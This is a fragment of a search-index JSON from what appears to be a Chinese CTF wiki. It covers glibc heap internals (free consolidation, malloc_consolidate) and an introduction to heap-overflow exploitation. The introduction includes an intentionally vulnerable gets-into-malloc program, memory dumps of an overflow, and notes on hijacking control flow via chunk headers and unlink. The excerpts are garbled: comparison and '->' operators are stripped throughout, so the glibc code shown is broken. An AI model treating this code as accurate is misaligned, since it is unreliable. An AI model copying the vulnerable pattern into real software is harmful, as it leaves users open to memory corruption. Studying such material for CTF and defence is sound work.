\u4e0b\u4e00\u4e2achunk\u7684\u5927\u5c0f \n         nextsize   =   chunksize ( nextchunk ); \n         // next chunk size valid check \n         // \u5224\u65ad\u4e0b\u4e00\u4e2achunk\u7684\u5927\u5c0f\u662f\u5426\u4e0d\u5927\u4e8e2*SIZE_SZ\uff0c\u6216\u8005 \n         // nextsize\u662f\u5426\u5927\u4e8e\u7cfb\u7edf\u53ef\u63d0\u4f9b\u7684\u5185\u5b58 \n         if   ( __builtin_expect ( chunksize_nomask ( nextchunk )   =   2   *   SIZE_SZ ,   0 )   || \n             __builtin_expect ( nextsize   =   av - system_mem ,   0 ))   { \n             errstr   =   free(): invalid next size (normal) ; \n             goto   errout ; \n         }", 
            "title": "\u8f7b\u91cf\u7ea7\u7684\u68c0\u6d4b"
        }, 
        {
            "location": "/pwn/heap/heap_implementation_details/#_13", 
            "text": "//\u5c06\u6307\u9488\u7684mem\u90e8\u5206\u5168\u90e8\u8bbe\u7f6e\u4e3aperturb_byte  \n         free_perturb ( chunk2mem ( p ),   size   -   2   *   SIZE_SZ );", 
            "title": "\u91ca\u653e\u586b\u5145"
        }, 
        {
            "location": "/pwn/heap/heap_implementation_details/#-chunk", 
            "text": "/* consolidate backward */ \n         if   ( ! prev_inuse ( p ))   { \n             prevsize   =   prev_size ( p ); \n             size   +=   prevsize ; \n             p   =   chunk_at_offset ( p ,   - (( long )   prevsize )); \n             unlink ( av ,   p ,   bck ,   fwd ); \n         }", 
            "title": "\u540e\u5411\u5408\u5e76-\u5408\u5e76\u4f4e\u5730\u5740 chunk"
        }, 
        {
            "location": "/pwn/heap/heap_implementation_details/#top-chunk-chunk", 
            "text": "\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u5982\u679c\u4e0b\u4e00\u5757\u4e0d\u662f top chunk \u540e\uff0c\u5219\u5408\u5e76\u9ad8\u5730\u5740\u7684 chunk \uff0c\u5e76\u5c06\u5408\u5e76\u540e\u7684 chunk \u653e\u5165\u5230unsorted bin\u4e2d\u3002           // \u5982\u679c\u4e0b\u4e00\u4e2achunk\u4e0d\u662ftop chunk \n         if   ( nextchunk   !=   av - top )   { \n             /* get and clear inuse bit */ \n             // \u83b7\u53d6\u4e0b\u4e00\u4e2a chunk \u7684\u4f7f\u7528\u72b6\u6001 \n             nextinuse   =   inuse_bit_at_offset ( nextchunk ,   nextsize ); \n             // \u5982\u679c\u4e0d\u5728\u4f7f\u7528\uff0c\u5408\u5e76\uff0c\u5426\u5219\u6e05\u7a7a\u5f53\u524dchunk\u7684\u4f7f\u7528\u72b6\u6001\u3002 \n             /* consolidate forward */ \n             if   ( ! nextinuse )   { \n                 unlink ( av ,   nextchunk ,   bck ,   fwd ); \n                 size   +=   nextsize ; \n             }   else \n                 clear_inuse_bit_at_offset ( nextchunk ,   0 ); \n\n             /*            Place the chunk in unsorted chunk list. Chunks are            not placed into regular bins until after they have            been given one chance to be used in malloc.              */ \n             // \u628a chunk \u653e\u5728 unsorted chunk \u94fe\u8868\u7684\u5934\u90e8 \n             bck   =   unsorted_chunks ( av ); \n             fwd   =   bck - fd ; \n             // \u7b80\u5355\u7684\u68c0\u67e5 \n             if   ( __glibc_unlikely ( fwd - bk   !=   bck ))   { \n                 errstr   =   free(): corrupted unsorted chunks ; \n                 goto   errout ; \n             } \n             p - fd   =   fwd ; \n             p - bk   =   bck ; \n             // \u5982\u679c\u662f large chunk\uff0c\u90a3\u5c31\u8bbe\u7f6enextsize\u6307\u9488\u5b57\u6bb5\u4e3aNULL\u3002 \n             if   ( ! in_smallbin_range ( size ))   { \n                 p - fd_nextsize   =   NULL ; \n                 p - bk_nextsize   =   NULL ; \n             } \n             bck - fd   =   p ; \n             fwd - bk   =   p ; \n\n             set_head ( p ,   size   |   PREV_INUSE ); \n             set_foot ( p ,   size ); \n\n             check_free_chunk ( av ,   p ); \n         }", 
            "title": "\u4e0b\u4e00\u5757\u4e0d\u662ftop chunk-\u524d\u5411\u5408\u5e76-\u5408\u5e76\u9ad8\u5730\u5740chunk"
        }, 
        {
            "location": "/pwn/heap/heap_implementation_details/#top-chunk-top-chunk", 
            "text": "/*            If the chunk borders the current high end of memory,            consolidate into top          */ \n         // \u5982\u679c\u8981\u91ca\u653e\u7684chunk\u7684\u4e0b\u4e00\u4e2achunk\u662ftop chunk\uff0c\u90a3\u5c31\u5408\u5e76\u5230 top chunk \n         else   { \n             size   +=   nextsize ; \n             set_head ( p ,   size   |   PREV_INUSE ); \n             av - top   =   p ; \n             check_chunk ( av ,   p ); \n         }", 
            "title": "\u4e0b\u4e00\u5757\u662ftop chunk-\u5408\u5e76\u5230top chunk"
        }, 
        {
            "location": "/pwn/heap/heap_implementation_details/#_14", 
            "text": "/*            If freeing a large space, consolidate possibly-surrounding            chunks. Then, if the total unused topmost memory exceeds trim            threshold, ask malloc_trim to reduce top.            Unless max_fast is 0, we don t know if there are fastbins            bordering top, so we cannot tell for sure whether threshold            has been reached unless fastbins are consolidated.  But we            don t want to consolidate on each free.  As a compromise,            consolidation is performed if FASTBIN_CONSOLIDATION_THRESHOLD            is reached.          */ \n          // \u5982\u679c\u5408\u5e76\u540e\u7684 chunk \u7684\u5927\u5c0f\u5927\u4e8eFASTBIN_CONSOLIDATION_THRESHOLD \n          // \u4e00\u822c\u5408\u5e76\u5230 top chunk \u90fd\u4f1a\u6267\u884c\u8fd9\u90e8\u5206\u4ee3\u7801\u3002 \n          // \u90a3\u5c31\u5411\u7cfb\u7edf\u8fd4\u8fd8\u5185\u5b58 \n         if   (( unsigned   long )   ( size )   =   FASTBIN_CONSOLIDATION_THRESHOLD )   { \n             // \u5982\u679c\u6709 fast chunk \u5c31\u8fdb\u884c\u5408\u5e76 \n             if   ( have_fastchunks ( av ))   malloc_consolidate ( av ); \n             // \u4e3b\u5206\u914d\u533a \n             if   ( av   ==   main_arena )   {  #ifndef MORECORE_CANNOT_TRIM \n                 // top chunk \u5927\u4e8e\u5f53\u524d\u7684\u6536\u7f29\u9619\u503c \n                 if   (( unsigned   long )   ( chunksize ( av - top ))   = \n                     ( unsigned   long )   ( mp_ . trim_threshold )) \n                     systrim ( mp_ . top_pad ,   av );  #endif       // \u975e\u4e3b\u5206\u914d\u533a\uff0c\u5219\u76f4\u63a5\u6536\u7f29heap \n             }   else   { \n                 /* Always try heap_trim(), even if the top chunk is not                     large, because the corresponding heap might go away.  */ \n                 heap_info   * heap   =   heap_for_ptr ( top ( av )); \n\n                 assert ( heap - ar_ptr   ==   av ); \n                 heap_trim ( heap ,   mp_ . top_pad ); \n             } \n         } \n\n         if   ( ! have_lock )   { \n             assert ( locked ); \n             __libc_lock_unlock ( av - mutex ); \n         }", 
            "title": "\u5411\u7cfb\u7edf\u8fd4\u8fd8\u5185\u5b58"
        }, 
        {
            "location": "/pwn/heap/heap_implementation_details/#mmapchunk", 
            "text": "}   else   { \n         //  If the chunk was allocated via mmap, release via munmap(). \n         munmap_chunk ( p ); \n     }", 
            "title": "\u91ca\u653emmap\u7684chunk"
        }, 
        {
            "location": "/pwn/heap/heap_implementation_details/#systrim", 
            "text": "", 
            "title": "systrim"
        }, 
        {
            "location": "/pwn/heap/heap_implementation_details/#heap_trim", 
            "text": "", 
            "title": "heap_trim"
        }, 
        {
            "location": "/pwn/heap/heap_implementation_details/#munmap_chunk", 
            "text": "", 
            "title": "munmap_chunk"
        }, 
        {
            "location": "/pwn/heap/heap_implementation_details/#_15", 
            "text": "", 
            "title": "\u5220\u9664\u5806"
        }, 
        {
            "location": "/pwn/heap/heap_implementation_details/#malloc_state", 
            "text": "", 
            "title": "malloc_state \u76f8\u5173\u51fd\u6570"
        }, 
        {
            "location": "/pwn/heap/heap_implementation_details/#malloc_init_state", 
            "text": "/*     Initialize a malloc_state struct.     This is called only from within malloc_consolidate, which needs     be called in the same contexts anyway.  It is never called directly     outside of malloc_consolidate because some optimizing compilers try     to inline it at all call points, which turns out not to be an     optimization at all. (Inlining it in malloc_consolidate is fine though.)   */  static   void   malloc_init_state ( mstate   av )   { \n     int       i ; \n     mbinptr   bin ; \n\n     /* Establish circular links for normal bins */ \n     for   ( i   =   1 ;   i     NBINS ;   ++ i )   { \n         bin       =   bin_at ( av ,   i ); \n         bin - fd   =   bin - bk   =   bin ; \n     }  #if MORECORE_CONTIGUOUS \n     if   ( av   !=   main_arena )  #endif \n         set_noncontiguous ( av ); \n     if   ( av   ==   main_arena )   set_max_fast ( DEFAULT_MXFAST ); \n     // \u8bbe\u7f6e flags \u6807\u8bb0\u76ee\u524d\u6ca1\u6709fast chunk \n     av - flags   |=   FASTCHUNKS_BIT ; \n     // \u5c31\u662f unsorted bin \n     av - top   =   initial_top ( av );  }", 
            "title": "malloc_init_state"
        }, 
        {
            "location": "/pwn/heap/heap_implementation_details/#malloc_consolidate", 
            "text": "\u8be5\u51fd\u6570\u4e3b\u8981\u6709\u4e24\u4e2a\u529f\u80fd   \u82e5 fastbin \u672a\u521d\u59cb\u5316\uff0c\u5373 global_max_fast \u4e3a0\uff0c\u90a3\u5c31\u521d\u59cb\u5316 malloc_state\u3002  \u5982\u679c\u5df2\u7ecf\u521d\u59cb\u5316\u7684\u8bdd\uff0c\u5c31\u5408\u5e76 fastbin \u4e2d\u7684 chunk\u3002   \u57fa\u672c\u7684\u6d41\u7a0b\u5982\u4e0b", 
            "title": "malloc_consolidate"
        }, 
        {
            "location": "/pwn/heap/heap_implementation_details/#_16", 
            "text": "static   void   malloc_consolidate ( mstate   av )   { \n     mfastbinptr   * fb ;               /* current fastbin being consolidated */ \n     mfastbinptr   * maxfb ;            /* last fastbin (for loop control) */ \n     mchunkptr      p ;                /* current chunk being consolidated */ \n     mchunkptr      nextp ;            /* next chunk to consolidate */ \n     mchunkptr      unsorted_bin ;     /* bin header */ \n     mchunkptr      first_unsorted ;   /* chunk to link to */ \n\n     /* These have same use as in free() */ \n     mchunkptr         nextchunk ; \n     INTERNAL_SIZE_T   size ; \n     INTERNAL_SIZE_T   nextsize ; \n     INTERNAL_SIZE_T   prevsize ; \n     int               nextinuse ; \n     mchunkptr         bck ; \n     mchunkptr         fwd ;", 
            "title": "\u521d\u59cb"
        }, 
        {
            "location": "/pwn/heap/heap_implementation_details/#chunk_3", 
            "text": "/*        If max_fast is 0, we know that av hasn t        yet been initialized, in which case do so below      */ \n     // \u8bf4\u660e fastbin \u5df2\u7ecf\u521d\u59cb\u5316 \n     if   ( get_max_fast ()   !=   0 )   { \n         // \u6e05\u7a7a fastbin \u6807\u8bb0 \n         // \u56e0\u4e3a\u8981\u5408\u5e76 fastbin \u4e2d\u7684 chunk \u4e86\u3002 \n         clear_fastchunks ( av ); \n         //  \n         unsorted_bin   =   unsorted_chunks ( av ); \n\n         /*            Remove each chunk from fast bin and consolidate it, placing it            then in unsorted bin. Among other reasons for doing this,            placing in unsorted bin avoids needing to calculate actual bins            until malloc is sure that chunks aren t immediately going to be            reused anyway.          */ \n         // \u6309\u7167 fd \u987a\u5e8f\u904d\u5386 fastbin \u7684\u6bcf\u4e00\u4e2a bin\uff0c\u5c06 bin \u4e2d\u7684\u6bcf\u4e00\u4e2a chunk \u5408\u5e76\u6389\u3002 \n         maxfb   =   fastbin ( av ,   NFASTBINS   -   1 ); \n         fb      =   fastbin ( av ,   0 ); \n         do   { \n             p   =   atomic_exchange_acq ( fb ,   NULL ); \n             if   ( p   !=   0 )   { \n                 do   { \n                     check_inuse_chunk ( av ,   p ); \n                     nextp   =   p - fd ; \n\n                     /* Slightly streamlined version of consolidation code in                       * free() */ \n                     size        =   chunksize ( p ); \n                     nextchunk   =   chunk_at_offset ( p ,   size ); \n                     nextsize    =   chunksize ( nextchunk ); \n\n                     if   ( ! prev_inuse ( p ))   { \n                         prevsize   =   prev_size ( p ); \n                         size   +=   prevsize ; \n                         p   =   chunk_at_offset ( p ,   - (( long )   prevsize )); \n                         unlink ( av ,   p ,   bck ,   fwd ); \n                     } \n\n                     if   ( nextchunk   !=   av - top )   { \n                         // \u5224\u65ad nextchunk \u662f\u5426\u662f\u7a7a\u95f2\u7684\u3002 \n                         nextinuse   =   inuse_bit_at_offset ( nextchunk ,   nextsize ); \n\n                         if   ( ! nextinuse )   { \n                             size   +=   nextsize ; \n                             unlink ( av ,   nextchunk ,   bck ,   fwd ); \n                         }   else \n                          // \u8bbe\u7f6e nextchunk \u7684 prev inuse \u4e3a0\uff0c\u4ee5\u8868\u660e\u53ef\u4ee5\u5408\u5e76\u5f53\u524d fast chunk\u3002 \n                             clear_inuse_bit_at_offset ( nextchunk ,   0 ); \n\n                         first_unsorted       =   unsorted_bin - fd ; \n                         unsorted_bin - fd     =   p ; \n                         first_unsorted - bk   =   p ; \n\n                         if   ( ! in_smallbin_range ( size ))   { \n                             p - fd_nextsize   =   NULL ; \n                             p - bk_nextsize   =   NULL ; \n                         } \n\n                         set_head ( p ,   size   |   PREV_INUSE ); \n                         p - bk   =   unsorted_bin ; \n                         p - fd   =   first_unsorted ; \n                         set_foot ( p ,   size ); \n                     } \n\n                     else   { \n                         size   +=   nextsize ; \n                         set_head ( p ,   size   |   PREV_INUSE ); \n                         av - top   =   p ; \n                     } \n\n                 }   while   (( p   =   nextp )   !=   0 ); \n             } \n         }   while   ( fb ++   !=   maxfb );", 
            "title": "\u5408\u5e76 chunk"
        }, 
        {
            "location": "/pwn/heap/heap_implementation_details/#_17", 
            "text": "\u8bf4\u660e fastbin \u8fd8\u6ca1\u6709\u521d\u59cb\u5316\u3002       }   else   { \n         malloc_init_state ( av ); \n         // \u5728\u975e\u8c03\u8bd5\u60c5\u51b5\u4e0b\u6ca1\u6709\u4ec0\u4e48\u7528\uff0c\u5728\u8c03\u8bd5\u60c5\u51b5\u4e0b\uff0c\u505a\u4e00\u4e9b\u68c0\u6d4b\u3002 \n         check_malloc_state ( av ); \n     }", 
            "title": "\u521d\u59cb\u5316"
        }, 
        {
            "location": "/pwn/heap/heap_implementation_details/#_18", 
            "text": "\u4e0b\u9762\u7684\u4ee3\u7801\u7528\u4e8e\u652f\u6301\u6d4b\u8bd5\uff0c\u9ed8\u8ba4\u60c5\u51b5\u4e0b perturb_byte \u662f0\u3002  static   int   perturb_byte ;  static   void   alloc_perturb ( char   * p ,   size_t   n )   { \n     if   ( __glibc_unlikely ( perturb_byte ))   memset ( p ,   perturb_byte   ^   0xff ,   n );  }  static   void   free_perturb ( char   * p ,   size_t   n )   { \n     if   ( __glibc_unlikely ( perturb_byte ))   memset ( p ,   perturb_byte ,   n );  }", 
            "title": "\u6d4b\u8bd5\u652f\u6301"
        }, 
        {
            "location": "/pwn/heap/heapoverflow_basic/", 
            "text": "\u5806\u6ea2\u51fa\n\n\n\u4ecb\u7ecd\n\n\n\u5806\u6ea2\u51fa\u662f\u6307\u7a0b\u5e8f\u5411\u67d0\u4e2a\u5806\u5757\u4e2d\u5199\u5165\u7684\u5b57\u8282\u6570\u8d85\u8fc7\u4e86\u5806\u5757\u672c\u8eab\u53ef\u4f7f\u7528\u7684\u5b57\u8282\u6570\uff08\n\u4e4b\u6240\u4ee5\u662f\u53ef\u4f7f\u7528\u800c\u4e0d\u662f\u7528\u6237\u7533\u8bf7\u7684\u5b57\u8282\u6570\uff0c\u662f\u56e0\u4e3a\u5806\u7ba1\u7406\u5668\u4f1a\u5bf9\u7528\u6237\u6240\u7533\u8bf7\u7684\u5b57\u8282\u6570\u8fdb\u884c\u8c03\u6574\uff0c\u8fd9\u4e5f\u5bfc\u81f4\u53ef\u5229\u7528\u7684\u5b57\u8282\u6570\u90fd\u4e0d\u5c0f\u4e8e\u7528\u6237\u7533\u8bf7\u7684\u5b57\u8282\u6570\n\uff09\uff0c\u56e0\u800c\u5bfc\u81f4\u4e86\u6570\u636e\u6ea2\u51fa\uff0c\u5e76\u8986\u76d6\u5230\n\u7269\u7406\u76f8\u90bb\u7684\u9ad8\u5730\u5740\n\u7684\u4e0b\u4e00\u4e2a\u5806\u5757\u3002\n\n\n\u4e0d\u96be\u53d1\u73b0\uff0c\u5806\u6ea2\u51fa\u6f0f\u6d1e\u53d1\u751f\u7684\u57fa\u672c\u524d\u63d0\u662f\n\n\n\n\n\u7a0b\u5e8f\u5411\u5806\u4e0a\u5199\u5165\u6570\u636e\u3002\n\n\n\u5199\u5165\u7684\u6570\u636e\u5927\u5c0f\u6ca1\u6709\u88ab\u826f\u597d\u5730\u63a7\u5236\u3002\n\n\n\n\n\u5bf9\u4e8e\u653b\u51fb\u8005\u6765\u8bf4\uff0c\u5806\u6ea2\u51fa\u6f0f\u6d1e\u8f7b\u5219\u53ef\u4ee5\u4f7f\u5f97\u7a0b\u5e8f\u5d29\u6e83\uff0c\u91cd\u5219\u53ef\u4ee5\u4f7f\u5f97\u653b\u51fb\u8005\u63a7\u5236\u7a0b\u5e8f\u6267\u884c\u6d41\u7a0b\u3002\n\n\n\u5806\u6ea2\u51fa\u662f\u4e00\u79cd\u7279\u5b9a\u7684\u7f13\u51b2\u533a\u6ea2\u51fa\uff08\u8fd8\u6709\u6808\u6ea2\u51fa\uff0c bss \u6bb5\u6ea2\u51fa\u7b49)\u3002\u4f46\u662f\u5176\u4e0e\u6808\u6ea2\u51fa\u6240\u4e0d\u540c\u7684\u662f\uff0c\u5806\u4e0a\u5e76\u4e0d\u5b58\u5728\u8fd4\u56de\u5730\u5740\u7b49\u53ef\u4ee5\u8ba9\u653b\u51fb\u8005\u76f4\u63a5\u63a7\u5236\u6267\u884c\u6d41\u7a0b\u7684\u6570\u636e\uff0c\u56e0\u6b64\u6211\u4eec\u4e00\u822c\u65e0\u6cd5\u76f4\u63a5\u901a\u8fc7\u5806\u6ea2\u51fa\u6765\u63a7\u5236 EIP \u3002\u4e00\u822c\u6765\u8bf4\uff0c\u6211\u4eec\u5229\u7528\u5806\u6ea2\u51fa\u7684\u7b56\u7565\u662f\n\n\n\n\n\u8986\u76d6\u4e0e\u5176\n\u7269\u7406\u76f8\u90bb\u7684\u4e0b\u4e00\u4e2a chunk\n \u7684\u5185\u5bb9\u3002\n\n\nprev_size\n\n\nsize\uff0c\u4e3b\u8981\u6709\u4e09\u4e2a\u6bd4\u7279\u4f4d\uff0c\u4ee5\u53ca\u8be5\u5806\u5757\u771f\u6b63\u7684\u5927\u5c0f\u3002\n\n\nNON_MAIN_ARENA \n\n\nIS_MAPPED  \n\n\nPREV_INUSE \n\n\nthe True chunk size\n\n\n\n\n\n\nchunk content\uff0c\u4ece\u800c\u6539\u53d8\u7a0b\u5e8f\u56fa\u6709\u7684\u6267\u884c\u6d41\u3002\n\n\n\n\n\n\n\u5229\u7528\u5806\u4e2d\u7684\u673a\u5236\uff08\u5982 unlink \u7b49 \uff09\u6765\u5b9e\u73b0\u4efb\u610f\u5730\u5740\u5199\u5165\uff08 Write-Anything-Anywhere\uff09\u6216\u63a7\u5236\u5806\u5757\u4e2d\u7684\u5185\u5bb9\u7b49\u6548\u679c\uff0c\u4ece\u800c\u6765\u63a7\u5236\u7a0b\u5e8f\u7684\u6267\u884c\u6d41\u3002\n\n\n\n\n\u57fa\u672c\u793a\u4f8b\n\n\n\u4e0b\u9762\u6211\u4eec\u4e3e\u4e00\u4e2a\u7b80\u5355\u7684\u4f8b\u5b50\uff1a\n\n\n#include \nstdio.h\n\n\nint main(void) \n{\n  char *chunk;\n  chunk=malloc(24);\n  puts(\nGet input:\n);\n  gets(chunk);\n  return 0;\n}\n\n\n\n\n\u8fd9\u4e2a\u7a0b\u5e8f\u7684\u4e3b\u8981\u76ee\u7684\u662f\u8c03\u7528 malloc \u5206\u914d\u4e00\u5757\u5806\u4e0a\u7684\u5185\u5b58\uff0c\u4e4b\u540e\u5411\u8fd9\u4e2a\u5806\u5757\u4e2d\u5199\u5165\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u5982\u679c\u8f93\u5165\u7684\u5b57\u7b26\u4e32\u8fc7\u957f\u4f1a\u5bfc\u81f4\u6ea2\u51fa chunk \u7684\u533a\u57df\u5e76\u8986\u76d6\u5230\u5176\u540e\u7684 top chunk \u4e4b\u4e2d(\u5b9e\u9645\u4e0a puts \u5185\u90e8\u4f1a\u8c03\u7528 malloc \u5206\u914d\u5806\u5185\u5b58\uff0c\u8986\u76d6\u5230\u7684\u53ef\u80fd\u5e76\u4e0d\u662f top chunk)\u3002\n\n0x602000:   0x0000000000000000  0x0000000000000021 \n===chunk\n0x602010:   0x0000000000000000  0x0000000000000000\n0x602020:   0x0000000000000000  0x0000000000020fe1 \n===top chunk\n0x602030:   0x0000000000000000  0x0000000000000000\n0x602040:   0x0000000000000000  0x0000000000000000\n\n\nprint 'A'*100\n\u8fdb\u884c\u5199\u5165\n\n0x602000:   0x0000000000000000  0x0000000000000021 \n===chunk\n0x602010:   0x4141414141414141  0x4141414141414141\n0x602020:   0x4141414141414141  0x4141414141414141 \n===top chunk(\u5df2\u88ab\u6ea2\u51fa)\n0x602030:   0x4141414141414141  0x4141414141414141\n0x602040:   0x4141414141414141  0x4141414141414141\n\n\n\n\u5c0f\u603b\u7ed3\n\n\n\u5806\u6ea2\u51fa\u4e2d\u6bd4\u8f83\u91cd\u8981\u7684\u51e0\u4e2a\u6b65\u9aa4:\n\n\n\u5bfb\u627e\u5806\u5206\u914d\u51fd\u6570\n\n\n\u901a\u5e38\u6765\u8bf4\u5806\u662f\u901a\u8fc7\u8c03\u7528 glibc \u51fd\u6570 malloc \u8fdb\u884c\u5206\u914d\u7684\uff0c\u5728\u67d0\u4e9b\u60c5\u51b5\u4e0b\u4f1a\u4f7f\u7528 calloc \u5206\u914d\u3002calloc \u4e0e malloc \u7684\u533a\u522b\u662f \ncalloc \u5728\u5206\u914d\u540e\u4f1a\u81ea\u52a8\u8fdb\u884c\u6e05\u7a7a\uff0c\u8fd9\u5bf9\u4e8e\u67d0\u4e9b\u4fe1\u606f\u6cc4\u9732\u6f0f\u6d1e\u7684\u5229\u7528\u6765\u8bf4\u662f\u81f4\u547d\u7684\n\u3002\n\n\ncalloc(0x20);\n//\u7b49\u540c\u4e8e\nptr=malloc(0x20);\nmemset(ptr,0,0x20);\n\n\n\u9664\u6b64\u4e4b\u5916\uff0c\u8fd8\u6709\u4e00\u79cd\u5206\u914d\u662f\u7ecf\u7531 realloc \u8fdb\u884c\u7684\uff0crealloc \u51fd\u6570\u53ef\u4ee5\u8eab\u517c malloc \u548c free \u4e24\u4e2a\u51fd\u6570\u7684\u529f\u80fd\u3002\n\n#include \nstdio.h\n\n\nint main(void) \n{\n  char *chunk,*chunk1;\n  chunk=malloc(16);\n  chunk1=realloc(chunk,32);\n  return 0;\n}\n\n\nrealloc\u7684\u64cd\u4f5c\u5e76\u4e0d\u662f\u50cf\u5b57\u9762\u610f\u4e49\u4e0a\u90a3\u4e48\u7b80\u5355\uff0c\u5176\u5185\u90e8\u4f1a\u6839\u636e\u4e0d\u540c\u7684\u60c5\u51b5\u8fdb\u884c\u4e0d\u540c\u64cd\u4f5c\n\n\n\n\n\u5f53realloc(ptr,size)\u7684size\u4e0d\u7b49\u4e8eptr\u7684size\u65f6\n\n\n\u5982\u679c\u7533\u8bf7size\n\u539f\u6765size\n\n\n\u5982\u679cchunk\u4e0etop chunk\u76f8\u90bb\uff0c\u76f4\u63a5\u6269\u5c55\u8fd9\u4e2achunk\u5230\u65b0size\u5927\u5c0f\n\n\n\u5982\u679cchunk\u4e0etop chunk\u4e0d\u76f8\u90bb\uff0c\u76f8\u5f53\u4e8efree(ptr),malloc(new_size) \n\n\n\n\n\n\n\u5982\u679c\u7533\u8bf7size\n\u539f\u6765size\n\n\n\u5982\u679c\u76f8\u5dee\u4e0d\u8db3\u4ee5\u5bb9\u5f97\u4e0b\u4e00\u4e2a\u6700\u5c0fchunk(64\u4f4d\u4e0b32\u4e2a\u5b57\u8282\uff0c32\u4f4d\u4e0b16\u4e2a\u5b57\u8282)\uff0c\u5219\u4fdd\u6301\u4e0d\u53d8\n\n\n\u5982\u679c\u76f8\u5dee\u53ef\u4ee5\u5bb9\u5f97\u4e0b\u4e00\u4e2a\u6700\u5c0fchunk\uff0c\u5219\u5207\u5272\u539fchunk\u4e3a\u4e24\u90e8\u5206\uff0cfree\u6389\u540e\u4e00\u90e8\u5206\n\n\n\n\n\n\n\n\n\n\n\u5f53realloc(ptr,size)\u7684size\u7b49\u4e8e0\u65f6\uff0c\u76f8\u5f53\u4e8efree(ptr)\n\n\n\u5f53realloc(ptr,size)\u7684size\u7b49\u4e8eptr\u7684size\uff0c\u4e0d\u8fdb\u884c\u4efb\u4f55\u64cd\u4f5c\n\n\n\n\n\u5bfb\u627e\u5371\u9669\u51fd\u6570\n\n\n\u901a\u8fc7\u5bfb\u627e\u5371\u9669\u51fd\u6570\uff0c\u6211\u4eec\u5feb\u901f\u786e\u5b9a\u7a0b\u5e8f\u662f\u5426\u53ef\u80fd\u6709\u5806\u6ea2\u51fa\uff0c\u4ee5\u53ca\u6709\u7684\u8bdd\uff0c\u5806\u6ea2\u51fa\u7684\u4f4d\u7f6e\u5728\u54ea\u91cc\u3002\n\n\n\u5e38\u89c1\u7684\u5371\u9669\u51fd\u6570\u5982\u4e0b\n\n\n\n\n\u8f93\u5165\n\n\ngets\uff0c\u76f4\u63a5\u8bfb\u53d6\u4e00\u884c\uff0c\u5ffd\u7565 \n'\\x00'\n\n\nscanf\n\n\nvscanf\n\n\n\n\n\n\n\u8f93\u51fa\n\n\nsprintf\n\n\n\n\n\n\n\u5b57\u7b26\u4e32\n\n\nstrcpy\uff0c\u5b57\u7b26\u4e32\u590d\u5236\uff0c\u9047\u5230 \n'\\x00'\n \u505c\u6b62\n\n\nstrcat\uff0c\u5b57\u7b26\u4e32\u62fc\u63a5\uff0c\u9047\u5230 \n'\\x00'\n \u505c\u6b62\n\n\nbcopy\n\n\n\n\n\n\n\n\n\u786e\u5b9a\u586b\u5145\u957f\u5ea6\n\n\n\u8fd9\u4e00\u90e8\u5206\u4e3b\u8981\u662f\u8ba1\u7b97\n\u6211\u4eec\u5f00\u59cb\u5199\u5165\u7684\u5730\u5740\u4e0e\u6211\u4eec\u6240\u8981\u8986\u76d6\u7684\u5730\u5740\u4e4b\u95f4\u7684\u8ddd\u79bb\n\u3002\n\u4e00\u4e2a\u5e38\u89c1\u7684\u8bef\u533a\u662fmalloc\u7684\u53c2\u6570\u7b49\u4e8e\u5b9e\u9645\u5206\u914d\u5806\u5757\u7684\u5927\u5c0f\uff0c\u4f46\u662f\u4e8b\u5b9e\u4e0a ptmalloc \u5206\u914d\u51fa\u6765\u7684\u5927\u5c0f\u662f\u5bf9\u9f50\u7684\u3002\u8fd9\u4e2a\u957f\u5ea6\u4e00\u822c\u662f\u5b57\u957f\u76842\u500d\uff0c\u6bd4\u598232\u4f4d\u7cfb\u7edf\u662f8\u4e2a\u5b57\u8282\uff0c64\u4f4d\u7cfb\u7edf\u662f16\u4e2a\u5b57\u8282\u3002\u4f46\u662f\u5bf9\u4e8e\u4e0d\u5927\u4e8e2\u500d\u5b57\u957f\u7684\u8bf7\u6c42\uff0cmalloc\u4f1a\u76f4\u63a5\u8fd4\u56de2\u500d\u5b57\u957f\u7684\u5757\u4e5f\u5c31\u662f\u6700\u5c0fchunk\uff0c\u6bd4\u598264\u4f4d\u7cfb\u7edf\u6267\u884c\nmalloc(0)\n\u4f1a\u8fd4\u56de\u7528\u6237\u533a\u57df\u4e3a16\u5b57\u8282\u7684\u5757\u3002\n\n\n#include \nstdio.h\n\n\nint main(void) \n{\n  char *chunk;\n  chunk=malloc(0);\n  puts(\nGet input:\n);\n  gets(chunk);\n  return 0;\n}\n\n\n\n\n//\u6839\u636e\u7cfb\u7edf\u7684\u4f4d\u6570\uff0cmalloc\u4f1a\u5206\u914d8\u621616\u5b57\u8282\u7684\u7528\u6237\u7a7a\u95f4\n0x602000:   0x0000000000000000  0x0000000000000021\n0x602010:   0x0000000000000000  0x0000000000000000\n0x602020:   0x0000000000000000  0x0000000000020fe1\n0x602030:   0x0000000000000000  0x0000000000000000\n\n\n\u6ce8\u610f\u7528\u6237\u533a\u57df\u7684\u5927\u5c0f\u4e0d\u7b49\u4e8e chunk_hear.size\uff0cchunk_hear.size=\u7528\u6237\u533a\u57df\u5927\u5c0f+2*\u5b57\u957f\n\n\n\u8fd8\u6709\u4e00\u70b9\u662f\u4e4b\u524d\u6240\u8bf4\u7684\u7528\u6237\u7533\u8bf7\u7684\u5185\u5b58\u5927\u5c0f\u4f1a\u88ab\u4fee\u6539\uff0c\u5176\u6709\u53ef\u80fd\u4f1a\u4f7f\u7528\u4e0e\u5176\u7269\u7406\u76f8\u90bb\u7684\u4e0b\u4e00\u4e2achunk\u7684prev_size\u5b57\u6bb5\u50a8\u5b58\u5185\u5bb9\u3002\u56de\u5934\u518d\u6765\u770b\u4e0b\u4e4b\u524d\u7684\u793a\u4f8b\u4ee3\u7801\n\n#include \nstdio.h\n\n\nint main(void) \n{\n  char *chunk;\n  chunk=malloc(24);\n  puts(\nGet input:\n);\n  gets(chunk);\n  return 0;\n}\n\n\n\u89c2\u5bdf\u5982\u4e0a\u4ee3\u7801\uff0c\u6211\u4eec\u7533\u8bf7\u7684chunk\u5927\u5c0f\u662f24\u4e2a\u5b57\u8282\u3002\u4f46\u662f\u6211\u4eec\u5c06\u5176\u7f16\u8bd1\u4e3a64\u4f4d\u53ef\u6267\u884c\u7a0b\u5e8f\u65f6\uff0c\u5b9e\u9645\u4e0a\u5206\u914d\u7684\u5185\u5b58\u4f1a\u662f16\u4e2a\u5b57\u8282\u800c\u4e0d\u662f24\u4e2a\u3002\n\n0x602000:   0x0000000000000000  0x0000000000000021\n0x602010:   0x0000000000000000  0x0000000000000000\n0x602020:   0x0000000000000000  